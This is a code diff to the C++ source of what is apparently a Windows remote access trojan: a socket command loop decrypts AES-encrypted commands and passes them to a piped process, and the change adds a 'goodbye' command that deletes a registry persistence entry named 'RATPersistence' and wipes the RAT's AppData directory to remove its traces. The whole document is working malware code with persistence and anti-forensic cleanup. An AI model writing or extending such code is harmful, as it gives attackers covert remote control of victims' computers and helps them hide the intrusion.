@@ -2,8 +2,10 @@
 #include<winsock2.h>
 #include<string>
 #include<iostream>
+#include <filesystem>
 #include "include/keys.h"
 #include "include/crypto.h"
+#include "include/persist.h"
 #include <windows.h>
 
 
@@ -115,6 +117,33 @@ void commandLoop(SOCKET& s, HANDLE hReadOut, HANDLE hWriteIn, const std::string&
         }
         std::string message_enc(recvbuf,n);
         std::string messages_dec = decryptAES(key,message_enc);
+
+        if (messages_dec == "goodbye") {
+            std::cout << "Comando goodbye recibido " << std::endl;
+            // delete persistence
+            const std::wstring persistValue = L"RATPersistence";
+            deletePersistence(persistValue);
+
+            // delete rat path
+            std::filesystem::path appdata_path = getAppDataPath();
+            std::filesystem::path rat_path = appdata_path / "RAT";
+            if (directoryExist(rat_path)) {
+                if (deletePath(rat_path)) {
+                    std::cout << "RAT directory in AppData eliminated." << std::endl;
+                } else {
+                    std::cout << "Could not delete the RAT directory." << std::endl;
+                }
+            } else {
+                std::cout << "RAT directory does not exist." << std::endl;
+            }
+
+            // delete rat client
+
+
+            break;
+        }
+
+
         messages_dec +="\r\n";
 
         DWORD bytesWritten;
